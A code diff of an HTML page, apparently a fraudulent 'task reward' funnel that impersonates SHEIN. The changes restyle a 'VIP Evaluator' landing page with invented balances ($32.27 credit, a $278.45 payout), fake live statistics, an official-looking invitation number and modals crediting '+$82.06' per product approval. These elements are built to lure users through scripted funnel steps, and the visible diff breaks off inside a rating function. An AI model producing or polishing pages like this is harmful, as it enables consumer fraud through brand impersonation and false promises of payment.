@@ -167,70 +167,326 @@
 
     :root {
       --fb-bg: #f5f5f7;
+      --fb-bg: #f7f7f9;
       --fb-surface: #ffffff;
-      --fb-surface-soft: #f8f8f8;
+      --fb-surface-soft: #fafafa;
       --fb-text: #111111;
       --fb-muted: #666666;
-      --fb-line: #eeeeee;
-      --fb-blue: #000000;
+      --fb-line: #ebebeb;
+      --fb-blue: #111111;
       --fb-blue-hover: #222222;
       --fb-blue-soft: #f4f4f4;
       --fb-green: #008a3e;
       --fb-red: #666666;
       --shein-coral: #fa6338;
-      --shein-black: #000000;
+      --shein-black: #111111;
+      --shein-gold: #cfa859;
+      --shein-gold-soft: #fff9ed;
     }
-    body { background: var(--fb-bg); color: var(--fb-text); font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
-    .fb-shell { width: 100%; max-width: 430px; min-height: 100svh; margin: 0 auto; background: var(--fb-bg); box-shadow: 0 0 24px rgba(0,0,0,.08); }
-    .fb-header { position: sticky; top: 0; z-index: 50; display: flex; align-items: center; justify-content: space-between; min-height: 56px; padding: 10px 14px; background: var(--fb-surface); border-bottom: 1px solid var(--fb-line); }
+    body { background: #f0f1f5; color: var(--fb-text); font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; -webkit-font-smoothing: antialiased; }
+    
+    /* Top VIP Announcement Bar */
+    .vip-top-bar {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      background: #111111;
+      color: #ffffff;
+      padding: 6px 12px;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+    .vip-top-bar-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: #10b981;
+      box-shadow: 0 0 8px #10b981;
+      animation: statusPulse 1.8s infinite;
+    }
+    
+    .fb-shell { width: 100%; max-width: 440px; min-height: 100svh; margin: 0 auto; background: #ffffff; box-shadow: 0 10px 40px rgba(0,0,0,.08); border-left: 1px solid rgba(0,0,0,0.05); border-right: 1px solid rgba(0,0,0,0.05); }
+    .fb-header { position: sticky; top: 0; z-index: 50; display: flex; align-items: center; justify-content: space-between; min-height: 60px; padding: 10px 16px; background: rgba(255,255,255,0.94); backdrop-filter: blur(14px); -webkit-backdrop-filter: blur(14px); border-bottom: 1px solid var(--fb-line); }
     .fb-header-logo { height: 26px; width: auto; object-fit: contain; }
-    .fb-balance { display: inline-flex; align-items: center; gap: 6px; min-height: 34px; padding: 6px 12px; border-radius: 999px; background: #e8f8f0; color: #008a3e; font-size: 14px; font-weight: 800; letter-spacing: -0.2px; }
-    .fb-balance-icon { display: grid; place-items: center; width: 21px; height: 21px; border-radius: 5px; background: #008a3e; color: white; }
-    .fb-welcome { display: block; padding: 8px 0 20px; }
-    .fb-welcome-post { width: 100%; overflow: hidden; background: var(--fb-surface); border-top: 1px solid var(--fb-line); border-bottom: 1px solid var(--fb-line); }
-    .fb-welcome-top { display: flex; align-items: center; gap: 10px; padding: 14px; }
-    .fb-reward-avatar { display: grid; place-items: center; width: 42px; height: 42px; flex: none; border-radius: 50%; background: #000000; color: white; }
-    .fb-title { font-size: 16px; line-height: 1.2; font-weight: 800; color: #000000; letter-spacing: -0.2px; }
-    .fb-subline { margin-top: 2px; color: var(--fb-muted); font-size: 12px; font-weight: 500; }
-    .fb-welcome-body { padding: 4px 14px 18px; }
-    .fb-welcome-body h1 { font-size: 21px; line-height: 1.25; font-weight: 800; color: #000000; letter-spacing: -0.3px; }
-    .fb-welcome-body > p { margin-top: 8px; color: #333333; font-size: 14.5px; line-height: 1.45; }
-    .fb-earned { display: flex; align-items: center; gap: 9px; margin: 14px 0 10px; padding: 12px 14px; border-radius: 8px; background: #e8f8f0; color: #008a3e; font-size: 14px; font-weight: 800; }
-    .fb-start { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; min-height: 48px; margin-top: 16px; border-radius: 8px; background: #000000; color: white; font-size: 15px; font-weight: 800; letter-spacing: 0.02em; transition: background .15s ease, transform .15s ease; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
-    .fb-start:hover { background: #222222; }
-    .fb-start:active { transform: scale(.985); }
-    .fb-feed { padding-bottom: 28px; }
-    .fb-post { margin: 8px 0 0; overflow: hidden; background: var(--fb-surface); border-top: 1px solid var(--fb-line); border-bottom: 1px solid var(--fb-line); }
-
-    /* ─── SHEIN Product Card Specifics ─── */
-    .shein-card-top { display: flex; align-items: center; justify-content: space-between; padding: 12px 14px 10px; border-bottom: 1px solid var(--fb-line); }
+    
+    .fb-balance { display: inline-flex; align-items: center; gap: 7px; min-height: 36px; padding: 6px 14px; border-radius: 999px; background: #111111; color: #ffffff; font-size: 13.5px; font-weight: 800; letter-spacing: -0.2px; box-shadow: 0 3px 10px rgba(0,0,0,0.12); }
+    .fb-balance-icon { display: grid; place-items: center; width: 20px; height: 20px; border-radius: 50%; background: #10b981; color: white; }
+    
+    /* Luxury Welcome Invitation (Step 0) */
+    .fb-welcome { display: block; padding: 12px 14px 28px; background: #fafafc; }
+    .vip-invitation-card {
+      border-radius: 20px;
+      background: #ffffff;
+      border: 1px solid #ebebeb;
+      box-shadow: 0 12px 32px -8px rgba(0,0,0,0.06);
+      overflow: hidden;
+      position: relative;
+    }
+    .vip-card-banner {
+      background: linear-gradient(135deg, #111111 0%, #1f2937 100%);
+      color: #ffffff;
+      padding: 20px 18px 18px;
+      position: relative;
+    }
+    .vip-kicker-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 4px 10px;
+      border-radius: 999px;
+      background: rgba(255,255,255,0.14);
+      backdrop-filter: blur(6px);
+      color: #e5e7eb;
+      font-size: 10.5px;
+      font-weight: 800;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      margin-bottom: 10px;
+    }
+    .vip-card-title {
+      font-size: 21px;
+      font-weight: 900;
+      line-height: 1.2;
+      letter-spacing: -0.02em;
+      color: #ffffff;
+    }
+    .vip-card-subtitle {
+      margin-top: 6px;
+      font-size: 13px;
+      line-height: 1.45;
+      color: #9ca3af;
+    }
+    
+    .vip-card-content {
+      padding: 18px 16px 20px;
+    }
+    .vip-bonus-alert {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 14px;
+      border-radius: 12px;
+      background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
+      border: 1px solid #bbf7d0;
+      color: #166534;
+      margin-bottom: 16px;
+    }
+    .vip-bonus-alert-left {
+      display: flex;
+      align-items: center;
+      gap: 9px;
+    }
+    .vip-bonus-val {
+      font-size: 18px;
+      font-weight: 900;
+      color: #15803d;
+      letter-spacing: -0.01em;
+    }
+    
+    /* 3-Step Roadmap */
+    .vip-steps-list {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-bottom: 18px;
+    }
+    .vip-step-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      padding: 10px 12px;
+      border-radius: 12px;
+      background: #f9fafb;
+      border: 1px solid #f3f4f6;
+    }
+    .vip-step-num {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background: #111111;
+      color: #ffffff;
+      font-size: 12px;
+      font-weight: 800;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+    .vip-step-title {
+      font-size: 13.5px;
+      font-weight: 700;
+      color: #111827;
+      line-height: 1.25;
+    }
+    .vip-step-sub {
+      font-size: 11.5px;
+      color: #6b7280;
+      line-height: 1.35;
+      margin-top: 2px;
+    }
+    
+    /* Live Stats Pill */
+    .vip-stats-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-around;
+      padding: 10px;
+      background: #f9fafb;
+      border-radius: 10px;
+      margin-bottom: 18px;
+      font-size: 11.5px;
+      color: #4b5563;
+      font-weight: 600;
+    }
+    .vip-stats-divider { color: #d1d5db; }
+    
+    .fb-start {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      min-height: 52px;
+      border-radius: 14px;
+      background: #111111;
+      color: white;
+      font-size: 15px;
+      font-weight: 800;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.22);
+      transition: all .15s ease;
+      cursor: pointer;
+    }
+    .fb-start:hover { background: #262626; transform: translateY(-1px); }
+    .fb-start:active { transform: scale(0.98); }
+    
+    /* ─── SHEIN Product Card Specifics (Ultra High-End) ─── */
+    .fb-feed { padding-bottom: 30px; background: #fafafc; }
+    .shein-product-container {
+      margin: 12px 14px 20px;
+      border-radius: 20px;
+      background: #ffffff;
+      border: 1px solid #ebebeb;
+      box-shadow: 0 10px 30px -6px rgba(0,0,0,0.06);
+      overflow: hidden;
+    }
+    
+    .shein-card-top { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; border-bottom: 1px solid #f3f4f6; }
     .shein-brand-badge { display: flex; align-items: center; gap: 9px; }
-    .shein-brand-icon { width: 34px; height: 34px; border-radius: 8px; object-fit: contain; }
-    .shein-brand-title { display: flex; align-items: center; gap: 5px; font-size: 14.5px; font-weight: 800; color: #000000; }
+    .shein-brand-icon { width: 34px; height: 34px; border-radius: 50%; object-fit: contain; }
+    .shein-brand-title { display: flex; align-items: center; gap: 5px; font-size: 14px; font-weight: 800; color: #111111; }
     .shein-brand-title img { width: 14px; height: 14px; }
-    .shein-sku-line { font-size: 11px; color: #888888; font-weight: 500; display: flex; align-items: center; gap: 6px; }
-    .shein-tag-mini { display: inline-block; padding: 1px 6px; border-radius: 3px; background: #fff0eb; color: #fa6338; font-weight: 700; font-size: 10px; text-transform: uppercase; }
-    .shein-free-returns { display: flex; align-items: center; gap: 4px; font-size: 11.5px; color: #008a3e; font-weight: 600; background: #e8f8f0; padding: 3px 8px; border-radius: 999px; }
-    .shein-product-image-wrap { position: relative; width: 100%; background: #fbfbfb; overflow: hidden; }
-    .shein-product-media { display: block; width: 100%; max-height: 420px; object-fit: cover; }
-    .shein-overlay-tag { position: absolute; bottom: 12px; left: 12px; background: rgba(0,0,0,0.75); backdrop-filter: blur(4px); color: #ffffff; font-size: 11px; font-weight: 700; padding: 3px 9px; border-radius: 4px; letter-spacing: 0.03em; }
-    .shein-price-bar { display: flex; align-items: baseline; justify-content: space-between; padding: 12px 14px 4px; }
+    .shein-sku-line { font-size: 11px; color: #6b7280; font-weight: 500; display: flex; align-items: center; gap: 6px; }
+    .shein-tag-mini { display: inline-block; padding: 2px 7px; border-radius: 4px; background: #fef2f2; color: #ef4444; font-weight: 800; font-size: 10px; text-transform: uppercase; }
+    .shein-free-returns { display: flex; align-items: center; gap: 4px; font-size: 11px; color: #059669; font-weight: 700; background: #ecfdf5; padding: 3px 8px; border-radius: 999px; }
+    
+    .shein-product-image-wrap { position: relative; width: 100%; background: #f3f4f6; overflow: hidden; }
+    .shein-product-media { display: block; width: 100%; max-height: 440px; object-fit: cover; transition: transform .4s ease; }
+    .shein-overlay-tag { position: absolute; top: 12px; left: 12px; background: rgba(17,24,39,0.85); backdrop-filter: blur(6px); color: #ffffff; font-size: 10.5px; font-weight: 800; padding: 4px 10px; border-radius: 999px; letter-spacing: 0.05em; text-transform: uppercase; }
+    .shein-overlay-counter { position: absolute; bottom: 12px; right: 12px; background: rgba(0,0,0,0.65); backdrop-filter: blur(4px); color: #ffffff; font-size: 11px; font-weight: 700; padding: 3px 8px; border-radius: 6px; }
+    
+    /* Product Specs bar */
+    .shein-specs-bar {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      padding: 10px 16px 4px;
+    }
+    .shein-spec-pill {
+      font-size: 11px;
+      font-weight: 600;
+      color: #4b5563;
+      background: #f3f4f6;
+      padding: 3px 8px;
+      border-radius: 6px;
+    }
+    
+    .shein-price-bar { display: flex; align-items: baseline; justify-content: space-between; padding: 10px 16px 4px; }
     .shein-price-left { display: flex; align-items: baseline; gap: 8px; }
     .shein-curr-price { font-size: 24px; font-weight: 900; color: #fa6338; letter-spacing: -0.02em; }
-    .shein-old-price { font-size: 14px; color: #999999; text-decoration: line-through; }
-    .shein-discount-tag { display: inline-block; padding: 2px 6px; border-radius: 3px; background: #000000; color: #ffffff; font-size: 11px; font-weight: 800; line-height: 1.2; }
-    .shein-rating-badge { display: flex; align-items: center; gap: 4px; }
-    .shein-product-copy { padding: 4px 14px 12px; font-size: 14px; color: #222222; line-height: 1.45; border-bottom: 1px solid var(--fb-line); }
-    .shein-survey-box { padding: 16px 14px 18px; background: #ffffff; border-top: 6px solid var(--fb-bg); text-align: center; }
-    .shein-survey-kicker { font-size: 11.5px; font-weight: 800; color: #fa6338; text-transform: uppercase; letter-spacing: 0.05em; }
-    .shein-survey-question { margin-top: 6px; font-size: 16.5px; font-weight: 800; color: #000000; line-height: 1.3; }
-    .shein-votes { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 14px; max-width: 380px; margin-left: auto; margin-right: auto; }
-    .shein-vote { display: flex; align-items: center; justify-content: center; gap: 7px; min-height: 48px; padding: 8px 12px; border-radius: 8px; font-size: 13.5px; font-weight: 700; transition: transform .1s, filter .15s; }
+    .shein-old-price { font-size: 14px; color: #9ca3af; text-decoration: line-through; }
+    .shein-discount-tag { display: inline-block; padding: 2px 7px; border-radius: 4px; background: #111111; color: #ffffff; font-size: 11px; font-weight: 900; line-height: 1.2; }
+    
+    .shein-rating-badge { display: flex; align-items: center; gap: 5px; }
+    .shein-product-copy { padding: 4px 16px 14px; font-size: 13.5px; color: #374151; line-height: 1.5; border-bottom: 1px solid #f3f4f6; }
+    
+    /* ─── Interactive Reviewer Assessment Widget ─── */
+    .shein-survey-box {
+      padding: 18px 16px 20px;
+      background: #fafafc;
+      border-top: 1px solid #f3f4f6;
+      text-align: center;
+    }
+    .shein-survey-kicker { font-size: 11px; font-weight: 900; color: #111111; text-transform: uppercase; letter-spacing: 0.08em; }
+    .shein-survey-question { margin: 6px 0 14px; font-size: 15px; font-weight: 800; color: #111111; line-height: 1.35; }
+    
+    /* Star Rating Selector */
+    .shein-star-selector {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      margin-bottom: 6px;
+      padding: 6px 14px;
+      background: #ffffff;
+      border: 1px solid #e5e7eb;
+      border-radius: 999px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.03);
+    }
+    .shein-star-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-size: 22px;
+      color: #d1d5db;
+      line-height: 1;
+      transition: color 0.15s, transform 0.1s;
+      padding: 0 1px;
+    }
+    .shein-star-btn.active { color: #f59e0b; transform: scale(1.08); }
+    .shein-star-label {
+      font-size: 11.5px;
+      font-weight: 700;
+      color: #6b7280;
+      margin-left: 4px;
+    }
+    
+    /* Fit Chip Selectors */
+    .shein-fit-chips {
+      display: flex;
+      justify-content: center;
+      gap: 7px;
+      margin: 12px 0 16px;
+    }
+    .shein-chip-btn {
+      border: 1.5px solid #e5e7eb;
+      background: #ffffff;
+      color: #4b5563;
+      padding: 6px 12px;
+      border-radius: 8px;
+      font-size: 12px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.15s ease;
+    }
+    .shein-chip-btn.selected {
+      border-color: #111111;
+      background: #111111;
+      color: #ffffff;
+    }
+    
+    /* Recommendation Vote Buttons */
+    .shein-votes { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; max-width: 400px; margin: 0 auto; }
+    .shein-vote { display: flex; align-items: center; justify-content: center; gap: 7px; min-height: 50px; padding: 8px 12px; border-radius: 12px; font-size: 13px; font-weight: 800; cursor: pointer; transition: transform .1s, box-shadow .15s; }
     .shein-vote:active { transform: scale(0.98); }
-    .shein-vote-secondary { background: #f0f0f2; color: #444444; border: 1px solid #e0e0e4; }
-    .shein-vote-secondary:hover { background: #e6e6ea; }
-    .shein-vote-primary { background: #000000; color: #ffffff; box-shadow: 0 4px 12px rgba(0,0,0,0.18); }
-    .shein-vote-primary:hover { background: #222222; }
+    .shein-vote-secondary { background: #f3f4f6; color: #4b5563; border: 1px solid #e5e7eb; }
+    .shein-vote-secondary:hover { background: #e5e7eb; }
+    .shein-vote-primary { background: #111111; color: #ffffff; box-shadow: 0 4px 14px rgba(0,0,0,0.22); }
+    .shein-vote-primary:hover { background: #262626; box-shadow: 0 6px 18px rgba(0,0,0,0.3); }
 
     /* Legacy support styles maintained */
     .support-shell { display: flex; flex-direction: column; width: 100%; height: 100svh; height: 100dvh; min-height: 580px; background: var(--fb-surface); }
@@ -462,45 +718,95 @@
       <!-- ─────────────────────────────────────────── -->
       <div id="step-0" class="step active" data-funnel-view="tela_inicial">
         <div class="fb-shell appear">
+          <!-- Top announcement bar -->
+          <div class="vip-top-bar">
+            <span class="vip-top-bar-dot"></span>
+            <span>SHEIN VIP PORTAL · EXCLUSIVE INVITATION #SHP-9842 · VERIFIED ACCESS</span>
+          </div>
+
           <header class="fb-header">
             <img alt="SHEIN" width="118" height="28" class="fb-header-logo" src="images/shein-logo.svg">
             <div class="fb-balance">
-              <span class="fb-balance-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="2" y="5" width="20" height="14" rx="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line></svg></span>
-              <span>$ 32.27</span>
+              <span class="fb-balance-icon"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg></span>
+              <span style="letter-spacing:0.5px;">$ 32.27</span>
             </div>
           </header>
+
           <div class="fb-welcome">
-            <div class="fb-welcome-post">
-              <div class="fb-welcome-top">
-                <div class="fb-reward-avatar">
-                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                    <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon>
-                  </svg>
+            <div class="vip-invitation-card">
+              <div class="vip-card-banner">
+                <div class="vip-kicker-tag">
+                  <span>★ OFFICIAL EVALUATOR PASS</span>
                 </div>
-                <div><div class="fb-title">SHEIN VIP Evaluator</div><div class="fb-subline">Official Reviewer Program · 🛍️</div></div>
+                <h1 class="vip-card-title">Exclusive Reviewer Access Activated</h1>
+                <p class="vip-card-subtitle">
+                  You have been selected to evaluate emerging Spring/Summer 2026 fashion releases before general market distribution.
+                </p>
               </div>
-              <div class="fb-welcome-body">
-                <h1>✨ Welcome, Fashion Reviewer!</h1>
-                <p>You've been selected for SHEIN's Official Product Evaluator Program. Review new season items and get rewarded with real commissions!</p>
-                <div class="fb-earned">
-                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                  <polyline points="20 6 9 17 4 12"></polyline>
-                </svg>
-                <span>You've already earned US$32.27 welcome bonus!</span>
+
+              <div class="vip-card-content">
+                <!-- Welcome bonus alert -->
+                <div class="vip-bonus-alert">
+                  <div class="vip-bonus-alert-left">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                      <circle cx="12" cy="12" r="10"></circle>
+                      <line x1="12" y1="8" x2="12" y2="12"></line>
+                      <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                    </svg>
+                    <div>
+                      <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.04em;">Sign-on Credit Allocated</div>
+                      <div style="font-size:12.5px;color:#15803d;font-weight:600;">Instantly credited to your reviewer ID</div>
+                    </div>
+                  </div>
+                  <div class="vip-bonus-val">+$32.27</div>
                 </div>
-                <p>Evaluate 3 products from our trending collections to unlock your first commission withdrawal!</p>
+
+                <!-- 3-Step Roadmap -->
+                <div class="vip-steps-list">
+                  <div class="vip-step-item">
+                    <div class="vip-step-num">1</div>
+                    <div>
+                      <div class="vip-step-title">Review 3 Trend Pieces</div>
+                      <div class="vip-step-sub">Inspect authentic items from Frenchy, ICON & VCAY lines.</div>
+                    </div>
+                  </div>
+                  <div class="vip-step-item">
+                    <div class="vip-step-num">2</div>
+                    <div>
+                      <div class="vip-step-title">Submit Fit & Star Ratings</div>
+                      <div class="vip-step-sub">Give honest feedback on fabric, cut, and aesthetic quality.</div>
+                    </div>
+                  </div>
+                  <div class="vip-step-item">
+                    <div class="vip-step-num">3</div>
+                    <div>
+                      <div class="vip-step-title">Release $278.45 Total Payout</div>
+                      <div class="vip-step-sub">Direct deposit issued after completion of your 3 evaluations.</div>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- Live stats -->
+                <div class="vip-stats-bar">
+                  <span>🟢 <strong>1,482</strong> Reviewers Online</span>
+                  <span class="vip-stats-divider">|</span>
+                  <span>⏱ <strong>~2 mins</strong></span>
+                  <span class="vip-stats-divider">|</span>
+                  <span>💰 Avg. <strong>$274.20</strong></span>
+                </div>
+
+                <!-- CTA -->
                 <button onclick="nextStep()" class="fb-start" data-funnel-step="post_1">
-                <span>Start Product Evaluation</span>
-                <svg class="rotate-90 w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                  <path d="M18 11V6a2 2 0 0 0-4 0"></path><path d="M14 10V4a2 2 0 0 0-4 0v2"></path>
-                  <path d="M10 10.5V6a2 2 0 0 0-4 0v8"></path>
-                  <path d="M18 8a2 2 0 1 1 4 0v6a8 8 0 0 1-8 8h-2c-2.8 0-4.5-.86-5.99-2.34l-3.6-3.6a2 2 0 0 1 2.83-2.82L7 15"></path>
-                </svg>
-              </button>
+                  <span>START PRODUCT EVALUATION (BATCH #3)</span>
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="5" y1="12" x2="19" y2="12"></line>
+                    <polyline points="12 5 19 12 12 19"></polyline>
+                  </svg>
+                </button>
+              </div>
             </div>
           </div>
         </div>
-      </div>
       </div>
 
       <!-- ─────────────────────────────────────────── -->
@@ -509,15 +815,20 @@
       <div id="step-post" class="step">
         <div id="post-wrap" class="fb-shell fb-feed appear">
 
+          <!-- Top announcement bar -->
+          <div class="vip-top-bar">
+            <span class="vip-top-bar-dot"></span>
+            <span>SHEIN VIP PORTAL · EVALUATION IN PROGRESS · BATCH #3</span>
+          </div>
+
           <!-- Header -->
           <header class="fb-header">
               <img alt="SHEIN" width="118" height="28" class="fb-header-logo" src="images/shein-logo.svg">
               <div class="fb-balance">
-                <span class="fb-balance-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
-                  <rect x="2" y="5" width="20" height="14" rx="2"></rect>
-                  <line x1="2" y1="10" x2="22" y2="10"></line>
+                <span class="fb-balance-icon"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+                  <polyline points="20 6 9 17 4 12"></polyline>
                 </svg></span>
-                <span id="balance-post">$ 32.27</span>
+                <span id="balance-post" style="letter-spacing:0.5px;">$ 32.27</span>
               </div>
           </header>
 
@@ -584,24 +895,29 @@
   </div>
 
   <!-- ─────────────────────────────────────────── -->
-  <!-- MODAL: Balance Earned (green)               -->
+  <!-- MODAL: Balance Earned (VIP Luxury Style)     -->
   <!-- ─────────────────────────────────────────── -->
   <div id="modal-balance" class="modal-overlay">
-    <div class="bg-[#00C950] rounded-[32px] p-6 w-full max-w-[340px] text-center shadow-2xl relative overflow-hidden appear">
-      <!-- Animated checkmark -->
-      <div class="w-16 h-16 bg-white rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg relative">
-        <div class="absolute inset-0 blur-lg bg-green-500/20 rounded-full"></div>
-        <svg width="42" height="42" viewBox="0 0 100 100" class="relative z-10">
-          <circle class="anim-circle" cx="50" cy="50" r="40" stroke="#10B981" stroke-width="4" fill="transparent" stroke-linecap="round"></circle>
-          <path class="anim-check" d="M30 50L45 65L70 35" stroke="#10B981" stroke-width="4" fill="transparent" stroke-linecap="round" stroke-linejoin="round"></path>
+    <div class="vip-reward-modal rounded-[28px] p-7 w-full max-w-[360px] text-center shadow-2xl relative overflow-hidden appear" style="background:#111827;border:1.5px solid rgba(255,255,255,0.12);box-shadow:0 25px 60px -15px rgba(0,0,0,0.6);">
+      <!-- Glowing checkmark & gold star -->
+      <div class="w-16 h-16 bg-gradient-to-tr from-emerald-500 to-emerald-400 rounded-full flex items-center justify-center mx-auto mb-4 shadow-xl relative" style="background:linear-gradient(135deg, #059669 0%, #10b981 100%);box-shadow:0 8px 24px rgba(16,185,129,0.35);">
+        <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="20 6 9 17 4 12"></polyline>
         </svg>
       </div>
-      <h2 class="anim-fade-1 text-[20px] font-bold text-white mb-2">Review Submitted!</h2>
-      <p class="anim-fade-2 text-white/90 mb-4 leading-relaxed text-[15px]">Your product feedback was verified and recorded</p>
-      <div id="earned-amount" class="anim-fade-3 text-[32px] font-black text-white mb-6 drop-shadow-md">+$82.06</div>
+      <div style="font-size:11px;font-weight:800;color:#10b981;letter-spacing:0.08em;text-transform:uppercase;margin-bottom:4px;">Evaluation Verified ✓</div>
+      <h2 class="anim-fade-1 text-[21px] font-black text-white mb-1.5 tracking-tight">Review Registered!</h2>
+      <p class="anim-fade-2 text-gray-400 mb-4 leading-relaxed text-[13.5px]">Your product rating has been recorded and credited to your reviewer balance.</p>
+      
+      <!-- Amount Badge -->
+      <div style="background:rgba(16,185,129,0.12);border:1px solid rgba(16,185,129,0.3);border-radius:14px;padding:12px;margin-bottom:18px;">
+        <div style="font-size:11px;font-weight:700;color:#9ca3af;text-transform:uppercase;letter-spacing:0.04em;margin-bottom:2px;">Commission Credit Added</div>
+        <div id="earned-amount" class="text-[30px] font-black text-[#10b981] drop-shadow-sm tracking-tight">+$82.06</div>
+      </div>
+
       <div class="anim-fade-4">
-        <button onclick="continueFromBalance()" class="w-full bg-white hover:bg-white/90 text-black font-bold py-4 rounded-2xl text-[16px] transition-all transform active:scale-95 shadow-lg min-h-[54px]">
-          Continue
+        <button onclick="continueFromBalance()" class="w-full bg-white hover:bg-gray-100 text-[#111827] font-black py-4 rounded-xl text-[14.5px] uppercase tracking-wider transition-all transform active:scale-95 shadow-lg min-h-[52px]">
+          Continue →
         </button>
       </div>
     </div>
@@ -671,53 +987,56 @@
     {
       name: "SHEIN Frenchy",
       badge: "Best Seller #1 in Dresses",
-      category: "Dresses & Rompers",
+      category: "SS26 Runway Edit",
       logo: "images/shein-icon.svg",
       image: "https://images.unsplash.com/photo-1572804013309-59a88b7e92f1?auto=format&fit=crop&w=800&q=80",
       sku: "SKU: sw220418491",
       price: "$18.49",
       oldPrice: "$36.00",
       discount: "-48%",
+      specs: ["Fabric: 100% Breathable Viscose", "Fit: True to Size", "Cut: Sweetheart Split Midi"],
       text: 'French Romance Floral Puff-Sleeve Split Hem Midi Dress — Lightweight fabric with gentle stretch, vintage sweetheart neckline, and delicate botanical print. Trending for Spring/Summer.',
       rating: "4.9",
       ratingCount: "14,290 reviews",
-      question: "Would you recommend this dress to SHEIN shoppers?",
-      voteNo: "Not Recommended",
-      voteYes: "Highly Recommended"
+      question: "Would you recommend this dress for our Spring/Summer 2026 catalog?",
+      voteNo: "✕ Needs Improvement",
+      voteYes: "★ Approve (+ $82.06)"
     },
     {
       name: "SHEIN ICON",
       badge: "Trending Streetwear",
-      category: "Pants & Sets",
+      category: "Street Style Edit",
       logo: "images/shein-icon.svg",
       image: "https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?auto=format&fit=crop&w=800&q=80",
       sku: "SKU: sw230912048",
       price: "$23.99",
       oldPrice: "$42.00",
       discount: "-43%",
+      specs: ["Fabric: Heavy Twill Cotton Blend", "Fit: Relaxed High-Rise", "Detail: 6-Pocket Utility"],
       text: 'High-Waisted Utility Multi-Pocket Relaxed Cargo Trousers — Premium breathable cotton-twill blend, adjustable waist tabs, and relaxed streetwear fit for all-day comfort.',
       rating: "4.8",
       ratingCount: "8,920 reviews",
-      question: "Does this streetwear style match current fashion trends?",
-      voteNo: "Out of Style",
-      voteYes: "Trending & Stylish"
+      question: "Does this utility street style meet SHEIN's premium quality standard?",
+      voteNo: "✕ Needs Improvement",
+      voteYes: "★ Approve (+ $82.06)"
     },
     {
       name: "SHEIN VCAY",
-      badge: "Top Rated Accessory",
-      category: "Bags & Leather",
+      badge: "Top Rated Luxury Accessory",
+      category: "Signature Collection",
       logo: "images/shein-icon.svg",
       image: "https://images.unsplash.com/photo-1584917865442-de89df76afd3?auto=format&fit=crop&w=800&q=80",
       sku: "SKU: sw240109312",
       price: "$14.49",
       oldPrice: "$28.00",
       discount: "-48%",
+      specs: ["Material: Quilted Vegan Pebble Leather", "Hardware: Polished Gold-Tone", "Strap: Dual Chain & Crossbody"],
       text: 'Chic Quilted Vegan Leather Flap Crossbody Chain Bag — Gold-toned hardware, multiple interior compartments, and scratch-resistant vegan pebble leather finish.',
       rating: "5.0",
       ratingCount: "21,540 reviews",
-      question: "How do you evaluate the craftsmanship and aesthetic appeal?",
-      voteNo: "Average Quality",
-      voteYes: "Premium Quality"
+      question: "How do you rate the craftsmanship and aesthetic finish of this luxury handbag?",
+      voteNo: "✕ Needs Improvement",
+      voteYes: "★ Approve (+ $82.06)"
     }
   ];
 
@@ -828,49 +1147,116 @@
     });
   }
 
+  var currentRating = 5;
+  var currentFit = "True to Size";
+
+  function setStarRating(stars) {
+    currentRating = stars;
